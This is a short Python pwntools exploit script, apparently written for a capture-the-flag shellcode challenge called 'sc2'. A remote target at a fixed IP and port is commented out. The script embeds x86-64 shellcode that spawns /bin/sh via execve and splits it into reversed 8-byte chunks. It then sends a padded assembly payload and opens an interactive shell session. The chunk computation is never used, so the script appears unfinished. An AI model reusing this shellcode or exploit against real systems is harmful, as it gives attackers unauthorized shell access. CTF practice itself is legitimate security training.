#!/usr/bin/env python

from pwn import *
from pwnlib.asm import asm
from pwnlib.context import context

# r = remote('111.186.57.85', 30012)
r = process('./sc2')

context.os = 'linux'
context.arch = 'amd64'

r.recvline()
r.recvline()

raw_asm = """
    xor rcx, rcx
"""

group_size = 8

target_shellcodes = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

if tail := len(target_shellcodes) % group_size:
    target_shellcodes += b'\x48' * (group_size - tail)

# reverse all codes, since that's how stack works
target_shellcodes = target_shellcodes[::-1]

code_chunks = [target_shellcodes[i:i + group_size]
               for i in range(0, len(target_shellcodes), group_size)]

magic_numbers = []
for qword in code_chunks:
    buf = []
    for byte in qword:
        buf.append(hex(byte)[2:])
    magic_numbers.append(int(''.join(buf), base=16))

print(asm(raw_asm))
gen_code = asm(raw_asm).ljust(0x1000, b'8')
r.sendline(gen_code)
r.interactive()
